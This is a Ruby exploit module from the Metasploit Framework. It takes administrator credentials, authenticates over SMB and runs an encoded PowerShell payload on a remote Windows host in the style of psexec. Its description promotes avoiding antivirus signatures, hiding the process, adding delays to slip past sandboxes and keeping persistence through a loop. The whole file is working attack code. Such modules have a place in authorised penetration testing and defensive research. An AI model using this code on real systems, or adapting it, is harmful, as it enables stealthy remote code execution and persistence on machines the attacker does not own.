# -*- coding: binary -*-

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/exploit/powershell'

class Metasploit3 < Msf::Exploit::Remote
		Rank = ManualRanking

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB::Psexec
	include Msf::Exploit::Powershell
	include Msf::Auxiliary::Report
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows Authenticated Powershell Command Execution',
			'Description'    => %q{
					This module uses a valid administrator username and password to execute a powershell
				payload using a similar technique to the "psexec" utility provided by SysInternals. The
				payload is encoded in base64 and executed from the commandline using the -encodedcommand
				flag. Using this method, the payload is never written to disk, and given that each payload
				is unique, is not prone to signature based detection. Since executing shellcode in .NET
				requires the use of system resources from unmanaged memory space, the .NET (PSH) architecture
				must match that of the payload. Lastly, a persist option is provided to execute the payload
				in a while loop in order to maintain a form of persistence. In the event of a sandbox
				observing PSH execution, a delay and other obfuscation may be added to avoid detection.
				In order to avoid interactive process notifications for the current user, the psh payload has
				been reduced in size and wrapped in a powershell invocation which hides the process entirely.
			},

			'Author'         => [
				'Royce @R3dy__ Davis <rdavis[at]accuvant.com>', # PSExec command module
				'RageLtMan <rageltman[at]sempervictus' # PSH exploit, libs, encoders
			],

			'License'        => MSF_LICENSE,
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'WfsDelay'     => 10,
					'EXITFUNC' => 'thread'
				},
			'Payload'        =>
				{
					'Space'        => 8192,
					'DisableNops'  => true,
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'References'     => [
				[ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
				[ 'OSVDB', '3106'],
				[ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
				[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
				[ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
			]
		))

		register_options([
			OptBool.new('PERSIST', [false, 'Run the payload in a loop']),
			OptBool.new('PSH_OLD_METHOD', [false, 'Use powershell 1.0', false]),
		], self.class)
	end


	def exploit
		command = cmd_psh_payload(payload.encoded,datastore['PSH_OLD_METHOD'])

		#Try and authenticate with given credentials
		if connect
			begin
				smb_login
			rescue StandardError => autherror
				print_error("#{peer} - Unable to authenticate with given credentials: #{autherror}")
				return
			end
			# Execute the powershell command
			begin
				print_status("#{peer} - Executing the payload...")
				vprint_good(command)
				return psexec(command)
			rescue StandardError => exec_command_error
				print_error("#{peer} - Unable to execute specified command: #{exec_command_error}")
				return false
			end
			disconnect
		end
	end

	def peer
		return "#{rhost}:#{rport}"
	end

end
